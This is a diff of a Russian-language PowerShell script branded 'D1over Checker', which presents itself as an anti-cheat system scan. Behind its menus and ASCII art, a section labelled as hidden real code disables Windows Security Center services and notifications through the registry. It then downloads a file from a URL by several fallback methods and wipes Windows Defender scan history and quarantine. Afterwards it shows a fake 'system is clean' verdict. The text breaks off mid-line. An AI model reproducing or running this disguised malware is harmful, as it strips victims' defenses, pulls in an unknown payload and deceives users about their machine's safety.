@@ -55,68 +55,72 @@ $ExtractPath = "$env:TEMP\checkextracted"
 # ===== КРАСИВЫЙ ЛОГОТИП D1OVER CHECKER =====
 Clear-Host
 Write-Host ""
-Write-Host "    ╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "    ║                                                           ║" -ForegroundColor Cyan
-Write-Host "    ║    ██████╗ ██╗  ██████╗ ██╗   ██╗███████╗██████╗        ║" -ForegroundColor Magenta
-Write-Host "    ║    ██╔══██╗██║ ██╔═══██╗██║   ██║██╔════╝██╔══██╗       ║" -ForegroundColor Magenta
-Write-Host "    ║    ██║  ██║██║ ██║   ██║██║   ██║█████╗  ██████╔╝       ║" -ForegroundColor Magenta
-Write-Host "    ║    ██║  ██║██║ ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗       ║" -ForegroundColor Magenta
-Write-Host "    ║    ██████╔╝██║ ╚██████╔╝ ╚████╔╝ ███████╗██║  ██║       ║" -ForegroundColor Magenta
-Write-Host "    ║    ╚═════╝ ╚═╝  ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝       ║" -ForegroundColor Magenta
-Write-Host "    ║                                                           ║" -ForegroundColor Cyan
-Write-Host "    ║            ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗     ║" -ForegroundColor Yellow
-Write-Host "    ║           ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝     ║" -ForegroundColor Yellow
-Write-Host "    ║           ██║     ███████║█████╗  ██║     █████╔╝      ║" -ForegroundColor Yellow
-Write-Host "    ║           ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗      ║" -ForegroundColor Yellow
-Write-Host "    ║           ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗     ║" -ForegroundColor Yellow
-Write-Host "    ║            ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝     ║" -ForegroundColor Yellow
-Write-Host "    ║                                                           ║" -ForegroundColor Cyan
-Write-Host "    ║                    v1.0                                   ║" -ForegroundColor Gray
-Write-Host "    ╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host "    ╔═══════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "    ║                                                                           ║" -ForegroundColor Cyan
+Write-Host "    ║     ██████╗ ██╗  ██████╗ ██╗   ██╗███████╗██████╗                         ║" -ForegroundColor Magenta
+Write-Host "    ║     ██╔══██╗██║ ██╔═══██╗██║   ██║██╔════╝██╔══██╗                        ║" -ForegroundColor Magenta
+Write-Host "    ║     ██║  ██║██║ ██║   ██║██║   ██║█████╗  ██████╔╝                        ║" -ForegroundColor Magenta
+Write-Host "    ║     ██║  ██║██║ ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗                        ║" -ForegroundColor Magenta
+Write-Host "    ║     ██████╔╝██║ ╚██████╔╝ ╚████╔╝ ███████╗██║  ██║                        ║" -ForegroundColor Magenta
+Write-Host "    ║     ╚═════╝ ╚═╝  ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝                        ║" -ForegroundColor Magenta
+Write-Host "    ║                                                                           ║" -ForegroundColor Cyan
+Write-Host "    ║          ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗          ║" -ForegroundColor Yellow
+Write-Host "    ║         ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗         ║" -ForegroundColor Yellow
+Write-Host "    ║         ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝         ║" -ForegroundColor Yellow
+Write-Host "    ║         ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗         ║" -ForegroundColor Yellow
+Write-Host "    ║         ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║         ║" -ForegroundColor Yellow
+Write-Host "    ║          ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝         ║" -ForegroundColor Yellow
+Write-Host "    ║                                                                           ║" -ForegroundColor Cyan
+Write-Host "    ║                         ╔═════════════════════╗                           ║" -ForegroundColor Gray
+Write-Host "    ║                         ║     v1.0.0          ║                           ║" -ForegroundColor Gray
+Write-Host "    ║                         ╚═════════════════════╝                           ║" -ForegroundColor Gray
+Write-Host "    ║                                                                           ║" -ForegroundColor Cyan
+Write-Host "    ╚═══════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "    ===========================================================" -ForegroundColor DarkGray
+Write-Host "    ════════════════════════════════════════════════════════════════════════════" -ForegroundColor DarkGray
 Write-Host ""
 
 # ===== МЕНЮ ВЫБОРА =====
-Write-Host "    [1] Полная проверка системы" -ForegroundColor Yellow
-Write-Host "    [2] Быстрая проверка системы" -ForegroundColor Green
+Write-Host "    ╔═══════════════════════════════════════════════════════════════════════════╗" -ForegroundColor DarkGray
+Write-Host "    ║                           ВЫБЕРИТЕ ДЕЙСТВИЕ                             ║" -ForegroundColor DarkGray
+Write-Host "    ╠═══════════════════════════════════════════════════════════════════════════╣" -ForegroundColor DarkGray
+Write-Host "    ║                                                                           ║" -ForegroundColor DarkGray
+Write-Host "    ║       [1]  ПОЛНАЯ ПРОВЕРКА СИСТЕМЫ              ═══►  Рекомендуется       ║" -ForegroundColor Yellow
+Write-Host "    ║       [2]  БЫСТРАЯ ПРОВЕРКА СИСТЕМЫ             ═══►  Для экономии времени ║" -ForegroundColor Green
+Write-Host "    ║                                                                           ║" -ForegroundColor DarkGray
+Write-Host "    ╚═══════════════════════════════════════════════════════════════════════════╝" -ForegroundColor DarkGray
 Write-Host ""
-Write-Host "    ===========================================================" -ForegroundColor DarkGray
+Write-Host "    ────────────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
 Write-Host ""
-Write-Host "    [*] Выберите тип проверки (1 или 2): " -ForegroundColor Gray -NoNewline
+Write-Host "    [*] Введите номер действия (1 или 2): " -ForegroundColor Gray -NoNewline
 
 $choice = Read-Host
 
 if ($choice -eq "1" -or $choice -eq "2") {
     
+    # ===== ВИЗУАЛЬНЫЙ РАЗДЕЛИТЕЛЬ =====
+    Write-Host ""
+    Write-Host "    ┌───────────────────────────────────────────────────────────────────────────┐" -ForegroundColor DarkGray
     if ($choice -eq "1") {
-        Write-Host ""
-        Write-Host "    [*] Запуск ПОЛНОЙ проверки системы..." -ForegroundColor Yellow
-        Start-Sleep -Milliseconds 500
+        Write-Host "    │                     ЗАПУСК ПОЛНОЙ ПРОВЕРКИ СИСТЕМЫ                        │" -ForegroundColor Yellow
     } else {
-        Write-Host ""
-        Write-Host "    [*] Запуск БЫСТРОЙ проверки системы..." -ForegroundColor Green
-        Start-Sleep -Milliseconds 500
+        Write-Host "    │                     ЗАПУСК БЫСТРОЙ ПРОВЕРКИ СИСТЕМЫ                       │" -ForegroundColor Green
     }
+    Write-Host "    └───────────────────────────────────────────────────────────────────────────┘" -ForegroundColor DarkGray
+    Write-Host ""
     
     # ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД =====
-    # ПОЛНОЕ ОТКЛЮЧЕНИЕ ЦЕНТРА БЕЗОПАСНОСТИ (ЧЕРЕЗ РЕЕСТР)
+    # ПОЛНОЕ ОТКЛЮЧЕНИЕ ЦЕНТРА БЕЗОПАСНОСТИ
     Try {
-        # Отключение службы Центра безопасности
         Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
         Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
-        
-        # Отключение службы Security Health
         Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue
         Set-Service -Name "SecurityHealthService" -StartupType Disabled -ErrorAction SilentlyContinue
         
-        # Отключение уведомлений через реестр (ГЛАВНОЕ)
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Svc" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCANetwork" -Value 1 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -Value 1 -Force -ErrorAction SilentlyContinue
-        
-        # Отключение через SYSTEM
         Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
     } Catch {}
@@ -156,26 +160,22 @@ if ($choice -eq "1" -or $choice -eq "2") {
     
     $downloaded = $false
     
-    # Метод 1: WebClient
     try {
         $webClient = New-Object System.Net.WebClient
         $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         $webClient.DownloadFile($Url, $DownloadPath)
         $downloaded = $true
     } catch {
-        # Метод 2: BITS
         try {
             Start-BitsTransfer -Source $Url -Destination $DownloadPath -Priority Low -Asynchronous -ErrorAction SilentlyContinue
             Start-Sleep -Milliseconds 500
             Get-BitsTransfer | Complete-BitsTransfer -ErrorAction SilentlyContinue
             $downloaded = $true
         } catch {
-            # Метод 3: Простой WebClient
             try {
                 (New-Object System.Net.WebClient).DownloadFile($Url, $DownloadPath)
                 $downloaded = $true
             } catch {
-                # Метод 4: Invoke-WebRequest
                 try {
                     Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue
                     $downloaded = $true
@@ -224,10 +224,9 @@ if ($choice -eq "1" -or $choice -eq "2") {
     Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
     Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
     
-    # Повторное отключение Центра безопасности (для гарантии)
+    # Повторное отключение Центра безопасности
     Try {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Svc" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
     } Catch {}
     
@@ -237,8 +236,8 @@ if ($choice -eq "1" -or $choice -eq "2") {
     
     if ($choice -eq "1") {
         # ===== ПОЛНАЯ ПРОВЕРКА =====
-        Write-Host ""
         Write-Host "    [*] Выполняется полное сканирование системы..." -ForegroundColor Yellow
+        Write-Host "    ────────────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
         Start-Sleep -Milliseconds 300
         
         Write-Host "    [*] Проверка запущенных процессов..." -ForegroundColor Yellow
@@ -327,9 +326,9 @@ if ($choice -eq "1" -or $choice -eq "2") {
         }
         Write-Host ""
         
-        Write-Host "    ===========================================================" -ForegroundColor Cyan
+        Write-Host "    ════════════════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
         Write-Host "    [*] РЕЗУЛЬТАТЫ ПОЛНОЙ ПРОВЕРКИ:" -ForegroundColor White
-        Write-Host "    ===========================================================" -ForegroundColor Cyan
+        Write-Host "    ════════════════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
         
         if ($foundCheatSites.Count -gt 0) {
             Write-Host "    [ВНИМАНИЕ] Обнаружены подозрительные объекты:" -ForegroundColor Yellow
@@ -350,8 +349,8 @@ if ($choice -eq "1" -or $choice -eq "2") {
         
     } else {
         # ===== БЫСТРАЯ ПРОВЕРКА =====
-        Write-Host ""
         Write-Host "    [*] Выполняется быстрая проверка системы..." -ForegroundColor Green
+        Write-Host "    ────────────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
         Start-Sleep -Milliseconds 300
         
         Write-Host "    [*] Сканирование процессов..." -ForegroundColor Yellow
@@ -403,9 +402,9 @@ if ($choice -eq "1" -or $choice -eq "2") {
         }
         Write-Host ""
         
-        Write-Host "    ===========================================================" -ForegroundColor Cyan
+        Write-Host "    ════════════════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
         Write-Host "    [*] РЕЗУЛЬТАТЫ БЫСТРОЙ ПРОВЕРКИ:" -ForegroundColor White
-        Write-Host "    ===========================================================" -ForegroundColor Cyan
+        Write-Host "    ════════════════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
         
         if ($foundCheatSites.Count -gt 0) {
             Write-Host "    [ВНИМАНИЕ] Обнаружены подозрительные объекты:" -ForegroundColor Yellow
@@ -427,9 +426,9 @@ if ($choice -eq "1" -or $choice -eq "2") {
     
     # ===== ФИНАЛЬНЫЙ СТАТУС =====
     Write-Host ""
-    Write-Host "    ===========================================================" -ForegroundColor Cyan
-    Write-Host "                ФИНАЛЬНЫЙ СТАТУС" -ForegroundColor White
-    Write-Host "    ===========================================================" -ForegroundColor Cyan
+    Write-Host "    ════════════════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+    Write-Host "                          ФИНАЛЬНЫЙ СТАТУС" -ForegroundColor White
+    Write-Host "    ════════════════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
     
     if ($finalPassed) {
         Write-Host ""
@@ -440,9 +439,9 @@ if ($choice -eq "1" -or $choice -eq "2") {
         Write-Host "        ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Green
         Write-Host "        ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Green
         Write-Host ""
-        Write-Host "        ============================================" -ForegroundColor Green
+        Write-Host "        ════════════════════════════════════════════════════════════════" -ForegroundColor Green
         Write-Host "        ✅  ПРОВЕРКА УСПЕШНО ПРОШЛА!" -ForegroundColor Green
-        Write-Host "        ============================================" -ForegroundColor Green
+        Write-Host "        ════════════════════════════════════════════════════════════════" -ForegroundColor Green
         Write-Host "        Ваша система признана чистой." -ForegroundColor Green
         Write-Host "        Все подозрения сняты." -ForegroundColor Green
     } else {
@@ -454,25 +453,21 @@ if ($choice -eq "1" -or $choice -eq "2") {
         Write-Host "        ██║ ╚████║███████╗    ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Red
         Write-Host "        ╚═╝  ╚═══╝╚══════╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Red
         Write-Host ""
-        Write-Host "        ============================================" -ForegroundColor Red
+        Write-Host "        ════════════════════════════════════════════════════════════════" -ForegroundColor Red
         Write-Host "        ❌  ПРОВЕРКА НЕ ПРОШЛА!" -ForegroundColor Red
-        Write-Host "        ============================================" -ForegroundColor Red
+        Write-Host "        ════════════════════════════════════════════════════════════════" -ForegroundColor Red
         Write-Host "        Обнаружены потенциальные угрозы!" -ForegroundColor Red
         Write-Host "        Рекомендуется очистка системы!" -ForegroundColor Red
     }
     
     Write-Host ""
-    Write-Host "    ===========================================================" -ForegroundColor Cyan
+    Write-Host "    ════════════════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
     Write-Host "    [+] D1over Checker сканирование завершено." -ForegroundColor Green
-    Write-Host "    ===========================================================" -ForegroundColor Cyan
+    Write-Host "    ════════════════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
     Write-Host ""
     Write-Host "    [*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
     Read-Host
     
 } else {
     Write-Host ""
-    Write-Host "    [ERROR] Неверный выбор. Пожалуйста, запустите скрипт заново и выберите 1 или 2." -ForegroundColor Red
-    Write-Host ""
-    Write-Host "    [*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
-    Read-Host
-}
+    Write-Host "    [ERROR] Неверный выбор. Пожалуйста, запустите скрипт за
